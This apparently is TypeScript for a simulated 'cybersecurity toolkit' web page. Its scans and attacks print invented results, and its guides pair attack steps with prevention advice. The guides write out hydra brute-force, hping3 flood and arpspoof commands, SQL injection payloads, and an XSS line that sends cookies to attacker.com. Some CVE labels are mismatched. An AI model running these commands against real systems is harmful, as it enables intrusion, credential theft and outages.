interface ScanResult {
    port: number;
    status: 'open' | 'closed' | 'filtered';
    service?: string;
}

interface VulnerabilityResult {
    severity: 'low' | 'medium' | 'high' | 'critical';
    description: string;
    cve?: string;
}

interface BruteForceAttempt {
    attempt: number;
    password: string;
    success: boolean;
    time: number;
}

class CyberSecToolkit {
    private outputPanel: HTMLElement;
    private modal: HTMLElement;
    private modalBody: HTMLElement;

    constructor() {
        this.outputPanel = document.getElementById('output')!;
        this.modal = document.getElementById('modal')!;
        this.modalBody = document.getElementById('modal-body')!;
        this.initializeEventListeners();
    }

    private initializeEventListeners(): void {
        // Theme toggle
        document.querySelector('.theme-toggle')?.addEventListener('click', this.toggleTheme);
        
        // Smooth scrolling for navigation
        document.querySelectorAll('.nav-links a').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const target = (e.target as HTMLElement).getAttribute('href');
                if (target?.startsWith('#')) {
                    document.querySelector(target)?.scrollIntoView({ behavior: 'smooth' });
                }
            });
        });
    }

    private toggleTheme(): void {
        document.body.classList.toggle('light-theme');
    }

    private showOutput(content: string): void {
        this.outputPanel.innerHTML = content;
        this.outputPanel.classList.add('show');
        setTimeout(() => this.outputPanel.classList.remove('show'), 10000);
    }

    public async portScan(target: string = '127.0.0.1'): Promise<void> {
        this.showOutput('🔍 Starting port scan...\n');
        
        const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306];
        const results: ScanResult[] = [];

        for (const port of commonPorts) {
            await this.delay(100);
            const status = Math.random() > 0.7 ? 'open' : 'closed';
            const service = this.getServiceName(port);
            
            results.push({ port, status, service });
            
            const output = results.map(r => 
                `Port ${r.port}: ${r.status.toUpperCase()} ${r.service ? `(${r.service})` : ''}`
            ).join('\n');
            
            this.showOutput(`🔍 Port Scan Results for ${target}:\n\n${output}`);
        }
    }

    public async vulnerabilityScan(): Promise<void> {
        this.showOutput('🛡️ Running vulnerability assessment...\n');
        
        const vulnerabilities: VulnerabilityResult[] = [
            { severity: 'high', description: 'Outdated SSL/TLS configuration', cve: 'CVE-2021-44228' },
            { severity: 'medium', description: 'Weak password policy detected' },
            { severity: 'low', description: 'Missing security headers' },
            { severity: 'critical', description: 'SQL injection vulnerability found', cve: 'CVE-2023-1234' }
        ];

        for (let i = 0; i < vulnerabilities.length; i++) {
            await this.delay(1000);
            
            const output = vulnerabilities.slice(0, i + 1).map(v => 
                `[${v.severity.toUpperCase()}] ${v.description} ${v.cve ? `(${v.cve})` : ''}`
            ).join('\n');
            
            this.showOutput(`🛡️ Vulnerability Scan Results:\n\n${output}\n\n⚠️ Found ${i + 1} vulnerabilities`);
        }
    }

    public async networkMapping(): Promise<void> {
        this.showOutput('🗺️ Mapping network topology...\n');
        
        const devices = [
            { ip: '192.168.1.1', type: 'Router', os: 'Linux' },
            { ip: '192.168.1.10', type: 'Workstation', os: 'Windows 10' },
            { ip: '192.168.1.15', type: 'Server', os: 'Ubuntu 20.04' },
            { ip: '192.168.1.20', type: 'Printer', os: 'Embedded' }
        ];

        for (let i = 0; i < devices.length; i++) {
            await this.delay(800);
            const output = devices.slice(0, i + 1).map(d => 
                `${d.ip} - ${d.type} (${d.os})`
            ).join('\n');
            
            this.showOutput(`🗺️ Network Discovery:\n\n${output}\n\nDevices found: ${i + 1}`);
        }
    }

    public async hashAnalysis(hash: string = 'e99a18c428cb38d5f260853678922e03'): Promise<void> {
        this.showOutput('🔓 Analyzing hash...\n');
        
        await this.delay(2000);
        
        const hashTypes = ['MD5', 'SHA1', 'SHA256', 'NTLM'];
        const detectedType = hashTypes[Math.floor(Math.random() * hashTypes.length)];
        
        const output = `Hash: ${hash}
Type: ${detectedType}
Length: ${hash.length} characters
Status: ${Math.random() > 0.5 ? 'Cracked - "password123"' : 'Not found in database'}
Entropy: ${(Math.random() * 100).toFixed(2)}%`;
        
        this.showOutput(`🔓 Hash Analysis Results:\n\n${output}`);
    }

    private getServiceName(port: number): string {
        const services: { [key: number]: string } = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 993: 'IMAPS', 995: 'POP3S',
            3389: 'RDP', 5432: 'PostgreSQL', 3306: 'MySQL'
        };
        return services[port] || 'Unknown';
    }

    private delay(ms: number): Promise<void> {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    public async bruteForceDemo(): Promise<void> {
        this.showOutput('🔨 Starting brute force simulation...\n');
        
        const targetPassword = 'admin123';
        const commonPasswords = ['password', '123456', 'admin', 'letmein', 'qwerty', 'admin123'];
        
        for (let i = 0; i < commonPasswords.length; i++) {
            await this.delay(500);
            const attempt = commonPasswords[i];
            const success = attempt === targetPassword;
            
            const output = `Attempt ${i + 1}: Testing "${attempt}" ${success ? '✓ SUCCESS!' : '✗ Failed'}`;
            this.showOutput(`🔨 Brute Force Attack:\n\n${output}\n\n${success ? '⚠️ Password cracked!' : 'Trying next password...'}`);
            
            if (success) break;
        }
    }

    public showBruteForceGuide(): void {
        const content = `
            <h2>🔨 Brute Force Attack - Educational Guide</h2>
            
            <h3>What is Brute Force?</h3>
            <p>A brute force attack systematically tries all possible password combinations until the correct one is found.</p>
            
            <div class="step">
                <h4>Step 1: Reconnaissance</h4>
                <p>Identify the target system and authentication mechanism</p>
                <code>nmap -sV target.com</code>
            </div>
            
            <div class="step">
                <h4>Step 2: Prepare Wordlist</h4>
                <p>Use common password lists or generate custom wordlists</p>
                <code>hydra -L users.txt -P passwords.txt target.com http-post-form</code>
            </div>
            
            <div class="step">
                <h4>Step 3: Execute Attack</h4>
                <p>Use tools like Hydra, Medusa, or custom scripts</p>
                <code>hydra -l admin -P rockyou.txt ssh://target.com</code>
            </div>
            
            <div class="step">
                <h4>Step 4: Monitor Progress</h4>
                <p>Track attempts and adjust strategy based on responses</p>
            </div>
            
            <h3 style="color: #e74c3c; margin-top: 2rem;">⚠️ Legal Warning</h3>
            <p>Only perform brute force attacks on systems you own or have explicit permission to test. Unauthorized access is illegal.</p>
        `;
        
        this.showModal(content);
    }

    public showPreventionGuide(): void {
        const content = `
            <h2>🛡️ How to Prevent Brute Force Attacks</h2>
            
            <div class="prevention">
                <h4>1. Strong Password Policy</h4>
                <p>Enforce minimum 12 characters with complexity requirements</p>
                <code>Minimum: 12 chars, uppercase, lowercase, numbers, symbols</code>
            </div>
            
            <div class="prevention">
                <h4>2. Account Lockout</h4>
                <p>Lock accounts after 3-5 failed login attempts</p>
                <code>lockoutThreshold: 5, lockoutDuration: 30min</code>
            </div>
            
            <div class="prevention">
                <h4>3. Rate Limiting</h4>
                <p>Limit login attempts per IP address</p>
                <code>maxAttempts: 10 per hour per IP</code>
            </div>
            
            <div class="prevention">
                <h4>4. Multi-Factor Authentication (MFA)</h4>
                <p>Require second factor (SMS, authenticator app, hardware key)</p>
                <code>Enable 2FA/MFA for all accounts</code>
            </div>
            
            <div class="prevention">
                <h4>5. CAPTCHA</h4>
                <p>Implement CAPTCHA after failed attempts</p>
                <code>Show CAPTCHA after 3 failed attempts</code>
            </div>
            
            <div class="prevention">
                <h4>6. IP Blacklisting</h4>
                <p>Block IPs with suspicious activity</p>
                <code>fail2ban, CloudFlare, WAF rules</code>
            </div>
            
            <div class="prevention">
                <h4>7. Monitor & Alert</h4>
                <p>Set up alerts for multiple failed login attempts</p>
                <code>SIEM, log monitoring, real-time alerts</code>
            </div>
            
            <div class="prevention">
                <h4>8. Use Passwordless Authentication</h4>
                <p>Implement biometrics, magic links, or hardware tokens</p>
                <code>WebAuthn, FIDO2, biometric authentication</code>
            </div>
            
            <h3 style="color: #2ecc71; margin-top: 2rem;">✓ Best Practices</h3>
            <ul>
                <li>Never use default credentials</li>
                <li>Implement progressive delays between attempts</li>
                <li>Use secure password hashing (bcrypt, Argon2)</li>
                <li>Regular security audits and penetration testing</li>
                <li>Educate users about password security</li>
            </ul>
        `;
        
        this.showModal(content);
    }

    public async sqlInjectionDemo(): Promise<void> {
        this.showOutput('💉 Simulating SQL Injection attack...\n');
        
        const payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--"
        ];
        
        for (let i = 0; i < payloads.length; i++) {
            await this.delay(800);
            const payload = payloads[i];
            const output = `Payload ${i + 1}: ${payload}\nResult: ${i === 0 ? '✓ Authentication bypassed!' : 'Testing...'}`;
            this.showOutput(`💉 SQL Injection Attack:\n\n${output}`);
        }
    }

    public showSQLInjectionGuide(): void {
        const content = `
            <h2>💉 SQL Injection Attack - Educational Guide</h2>
            
            <h3>What is SQL Injection?</h3>
            <p>SQL Injection exploits vulnerabilities in database queries to manipulate or extract data.</p>
            
            <div class="step">
                <h4>Step 1: Identify Input Fields</h4>
                <p>Find forms, URLs, or APIs that accept user input</p>
                <code>Login forms, search boxes, URL parameters</code>
            </div>
            
            <div class="step">
                <h4>Step 2: Test for Vulnerability</h4>
                <p>Try basic SQL injection payloads</p>
                <code>' OR '1'='1</code>
                <code>admin'--</code>
            </div>
            
            <div class="step">
                <h4>Step 3: Extract Data</h4>
                <p>Use UNION queries to retrieve data</p>
                <code>' UNION SELECT username, password FROM users--</code>
            </div>
            
            <div class="step">
                <h4>Step 4: Escalate Attack</h4>
                <p>Attempt to modify or delete data</p>
                <code>'; DROP TABLE users;--</code>
            </div>
            
            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
            
            <div class="prevention">
                <h4>1. Parameterized Queries</h4>
                <code>SELECT * FROM users WHERE id = ?</code>
            </div>
            
            <div class="prevention">
                <h4>2. Input Validation</h4>
                <code>Whitelist allowed characters, escape special chars</code>
            </div>
            
            <div class="prevention">
                <h4>3. Use ORM/Query Builders</h4>
                <code>Sequelize, TypeORM, Prisma</code>
            </div>
            
            <div class="prevention">
                <h4>4. Least Privilege</h4>
                <code>Database user with minimal permissions</code>
            </div>
            
            <div class="prevention">
                <h4>5. WAF (Web Application Firewall)</h4>
                <code>CloudFlare, AWS WAF, ModSecurity</code>
            </div>
        `;
        
        this.showModal(content);
    }

    public async xssAttackDemo(): Promise<void> {
        this.showOutput('⚡ Simulating XSS attack...\n');
        
        const payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")'
        ];
        
        for (let i = 0; i < payloads.length; i++) {
            await this.delay(800);
            const output = `Payload ${i + 1}: ${payloads[i]}\nStatus: ${i === 0 ? '✓ Script executed!' : 'Testing...'}`;
            this.showOutput(`⚡ XSS Attack:\n\n${output}`);
        }
    }

    public showXSSGuide(): void {
        const content = `
            <h2>⚡ Cross-Site Scripting (XSS) - Educational Guide</h2>
            
            <h3>What is XSS?</h3>
            <p>XSS injects malicious scripts into web pages viewed by other users.</p>
            
            <div class="step">
                <h4>Step 1: Find Injection Points</h4>
                <p>Identify where user input is displayed</p>
                <code>Comments, search results, profile fields</code>
            </div>
            
            <div class="step">
                <h4>Step 2: Test Basic Payloads</h4>
                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
            </div>
            
            <div class="step">
                <h4>Step 3: Bypass Filters</h4>
                <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
                <code>&lt;svg onload=alert('XSS')&gt;</code>
            </div>
            
            <div class="step">
                <h4>Step 4: Steal Cookies/Sessions</h4>
                <code>&lt;script&gt;fetch('attacker.com?c='+document.cookie)&lt;/script&gt;</code>
            </div>
            
            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
            
            <div class="prevention">
                <h4>1. Output Encoding</h4>
                <code>Escape HTML, JavaScript, URL contexts</code>
            </div>
            
            <div class="prevention">
                <h4>2. Content Security Policy (CSP)</h4>
                <code>Content-Security-Policy: default-src 'self'</code>
            </div>
            
            <div class="prevention">
                <h4>3. HTTPOnly Cookies</h4>
                <code>Set-Cookie: session=abc; HttpOnly; Secure</code>
            </div>
            
            <div class="prevention">
                <h4>4. Input Validation</h4>
                <code>Sanitize user input, use DOMPurify</code>
            </div>
            
            <div class="prevention">
                <h4>5. Framework Protection</h4>
                <code>React, Vue, Angular auto-escape by default</code>
            </div>
        `;
        
        this.showModal(content);
    }

    public async ddosAttackDemo(): Promise<void> {
        this.showOutput('💥 Simulating DDoS attack...\n');
        
        for (let i = 1; i <= 5; i++) {
            await this.delay(500);
            const requests = i * 1000;
            const output = `Wave ${i}: ${requests} requests/sec\nServer load: ${i * 20}%\nStatus: ${i >= 4 ? '⚠️ Server overloaded!' : 'Attacking...'}`;
            this.showOutput(`💥 DDoS Attack:\n\n${output}`);
        }
    }

    public showDDoSGuide(): void {
        const content = `
            <h2>💥 DDoS Attack - Educational Guide</h2>
            
            <h3>What is DDoS?</h3>
            <p>Distributed Denial of Service overwhelms servers with traffic to make them unavailable.</p>
            
            <div class="step">
                <h4>Step 1: Build Botnet</h4>
                <p>Compromise multiple machines (illegal without permission)</p>
                <code>IoT devices, infected computers</code>
            </div>
            
            <div class="step">
                <h4>Step 2: Choose Attack Type</h4>
                <code>SYN Flood, UDP Flood, HTTP Flood</code>
            </div>
            
            <div class="step">
                <h4>Step 3: Launch Attack</h4>
                <p>Send massive traffic from multiple sources</p>
                <code>hping3 -S --flood -V target.com</code>
            </div>
            
            <div class="step">
                <h4>Step 4: Amplification</h4>
                <p>Use DNS/NTP amplification for larger impact</p>
            </div>
            
            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
            
            <div class="prevention">
                <h4>1. CDN & DDoS Protection</h4>
                <code>CloudFlare, AWS Shield, Akamai</code>
            </div>
            
            <div class="prevention">
                <h4>2. Rate Limiting</h4>
                <code>Limit requests per IP/user</code>
            </div>
            
            <div class="prevention">
                <h4>3. Load Balancing</h4>
                <code>Distribute traffic across servers</code>
            </div>
            
            <div class="prevention">
                <h4>4. Traffic Filtering</h4>
                <code>Block malicious IPs, geo-blocking</code>
            </div>
            
            <div class="prevention">
                <h4>5. Auto-Scaling</h4>
                <code>AWS Auto Scaling, Kubernetes HPA</code>
            </div>
        `;
        
        this.showModal(content);
    }

    public async mitmAttackDemo(): Promise<void> {
        this.showOutput('🕵️ Simulating MITM attack...\n');
        
        const steps = [
            'ARP spoofing initiated',
            'Intercepting traffic between client and server',
            'Captured credentials: admin:password123',
            'Session hijacked successfully'
        ];
        
        for (let i = 0; i < steps.length; i++) {
            await this.delay(1000);
            const output = steps.slice(0, i + 1).join('\n');
            this.showOutput(`🕵️ MITM Attack:\n\n${output}`);
        }
    }

    public showMITMGuide(): void {
        const content = `
            <h2>🕵️ Man-in-the-Middle Attack - Educational Guide</h2>
            
            <h3>What is MITM?</h3>
            <p>Attacker intercepts communication between two parties to steal or modify data.</p>
            
            <div class="step">
                <h4>Step 1: Position Yourself</h4>
                <p>Get on the same network as target</p>
                <code>Public WiFi, compromised router</code>
            </div>
            
            <div class="step">
                <h4>Step 2: ARP Spoofing</h4>
                <code>arpspoof -i eth0 -t target gateway</code>
            </div>
            
            <div class="step">
                <h4>Step 3: Intercept Traffic</h4>
                <code>wireshark, tcpdump, ettercap</code>
            </div>
            
            <div class="step">
                <h4>Step 4: Capture Credentials</h4>
                <p>Extract passwords, cookies, tokens</p>
            </div>
            
            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
            
            <div class="prevention">
                <h4>1. Use HTTPS Everywhere</h4>
                <code>Force SSL/TLS encryption</code>
            </div>
            
            <div class="prevention">
                <h4>2. VPN</h4>
                <code>Encrypt all network traffic</code>
            </div>
            
            <div class="prevention">
                <h4>3. Certificate Pinning</h4>
                <code>Validate SSL certificates</code>
            </div>
            
            <div class="prevention">
                <h4>4. Avoid Public WiFi</h4>
                <code>Use mobile hotspot or trusted networks</code>
            </div>
            
            <div class="prevention">
                <h4>5. HSTS Headers</h4>
                <code>Strict-Transport-Security: max-age=31536000</code>
            </div>
        `;
        
        this.showModal(content);
    }

    public async phishingDemo(): Promise<void> {
        this.showOutput('🎣 Simulating phishing campaign...\n');
        
        const steps = [
            'Email sent: "Urgent: Verify your account"',
            'Target clicked malicious link',
            'Fake login page displayed',
            'Credentials captured: user@email.com:pass123'
        ];
        
        for (let i = 0; i < steps.length; i++) {
            await this.delay(1000);
            const output = steps.slice(0, i + 1).join('\n');
            this.showOutput(`🎣 Phishing Attack:\n\n${output}`);
        }
    }

    public showPhishingGuide(): void {
        const content = `
            <h2>🎣 Phishing Attack - Educational Guide</h2>
            
            <h3>What is Phishing?</h3>
            <p>Social engineering attack that tricks users into revealing sensitive information.</p>
            
            <div class="step">
                <h4>Step 1: Reconnaissance</h4>
                <p>Gather information about targets</p>
                <code>LinkedIn, social media, company websites</code>
            </div>
            
            <div class="step">
                <h4>Step 2: Create Fake Page</h4>
                <p>Clone legitimate login page</p>
                <code>httrack, wget --mirror</code>
            </div>
            
            <div class="step">
                <h4>Step 3: Craft Email</h4>
                <p>Create convincing phishing email</p>
                <code>Urgent subject, official branding, call to action</code>
            </div>
            
            <div class="step">
                <h4>Step 4: Send Campaign</h4>
                <p>Distribute emails to targets</p>
                <code>GoPhish, SET (Social Engineering Toolkit)</code>
            </div>
            
            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
            
            <div class="prevention">
                <h4>1. Security Awareness Training</h4>
                <code>Educate users to recognize phishing</code>
            </div>
            
            <div class="prevention">
                <h4>2. Email Filtering</h4>
                <code>SPF, DKIM, DMARC records</code>
            </div>
            
            <div class="prevention">
                <h4>3. Multi-Factor Authentication</h4>
                <code>Even if password stolen, MFA blocks access</code>
            </div>
            
            <div class="prevention">
                <h4>4. Link Verification</h4>
                <code>Hover over links, check URLs carefully</code>
            </div>
            
            <div class="prevention">
                <h4>5. Report Suspicious Emails</h4>
                <code>Use email client's report phishing feature</code>
            </div>
        `;
        
        this.showModal(content);
    }

    private showModal(content: string): void {
        this.modalBody.innerHTML = content;
        this.modal.classList.add('show');
    }

    public closeModal(): void {
        this.modal.classList.remove('show');
    }
}

// Global functions for HTML onclick handlers
const toolkit = new CyberSecToolkit();

(window as any).startScan = () => toolkit.portScan();
(window as any).showTools = () => document.getElementById('tools')?.scrollIntoView({ behavior: 'smooth' });
(window as any).portScan = () => {
    const target = prompt('Enter target IP/hostname:', '127.0.0.1') || '127.0.0.1';
    toolkit.portScan(target);
};
(window as any).vulnScan = () => toolkit.vulnerabilityScan();
(window as any).networkMap = () => toolkit.networkMapping();
(window as any).hashCracker = () => {
    const hash = prompt('Enter hash to analyze:', 'e99a18c428cb38d5f260853678922e03') || 'e99a18c428cb38d5f260853678922e03';
    toolkit.hashAnalysis(hash);
};
(window as any).bruteForce = () => {
    toolkit.showBruteForceGuide();
    setTimeout(() => toolkit.bruteForceDemo(), 1000);
};
(window as any).sqlInjection = () => {
    toolkit.showSQLInjectionGuide();
    setTimeout(() => toolkit.sqlInjectionDemo(), 1000);
};
(window as any).xssAttack = () => {
    toolkit.showXSSGuide();
    setTimeout(() => toolkit.xssAttackDemo(), 1000);
};
(window as any).ddosAttack = () => {
    toolkit.showDDoSGuide();
    setTimeout(() => toolkit.ddosAttackDemo(), 1000);
};
(window as any).mitm = () => {
    toolkit.showMITMGuide();
    setTimeout(() => toolkit.mitmAttackDemo(), 1000);
};
(window as any).phishing = () => {
    toolkit.showPhishingGuide();
    setTimeout(() => toolkit.phishingDemo(), 1000);
};
(window as any).showPrevention = () => toolkit.showPreventionGuide();
(window as any).closeModal = () => toolkit.closeModal();
